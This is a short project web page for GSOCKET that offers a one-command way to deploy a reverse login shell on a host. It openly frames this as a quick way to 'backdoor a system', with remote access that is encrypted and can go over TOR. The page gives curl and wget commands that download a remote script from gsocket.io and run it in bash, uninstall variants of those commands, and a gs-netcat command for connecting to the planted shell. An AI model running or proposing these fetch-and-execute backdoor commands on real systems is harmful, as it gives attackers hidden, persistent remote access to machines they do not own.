---
layout: default
---

Deploy a reverse login shell with a *single command* (fully automated) - and access the shell remotely - encrypted - and via TOR if you like. 

> _This must be the quickest way to backdoor a system_
>                                                 -- anonymous

Use either one of these two commands to _deploy_:
```shell
bash -c "$(curl -fsSL gsocket.io/x)"
```

```shell
bash -c "$(wget -qO- gsocket.io/x)"
```

Use either one of these two commands to _uninstall_:
```shell
GS_UNDO=1 bash -c "$(curl -fsSL gsocket.io/x)"
```
```shell
GS_UNDO=1 bash -c "$(wget -qO- gsocket.io/x)"
```

Access the remote host from anywhere in the world:
```shell
$ gs-netcat -s ExampleSecretChagneMe -i
```
(To use gs-netcat you need to [install gsocket]({{site.github.repository_url}}\#installation-anchor))

---

This is just one example of GSOCKET. Visit the [GitHub Page]({{site.github.repository_url}}) for more.  

---
{:refdef: style="text-align: center;"}
Screenshots
{: refdef}
Deploy on a host
{:refdef: style="text-align: center;"}
![Deploy-Example](../assets/images/deploy-example.png)
{: refdef}
Log in to the host from a workstation
{:refdef: style="text-align: center;"}
![Deploy-Login](../assets/images/deploy-login.png)
{: refdef}
---
Get Involved. We are looking for volunteers to work on the website and a logo and to discuss new ideas. [Join us on telegram](https://t.me/thcorg).

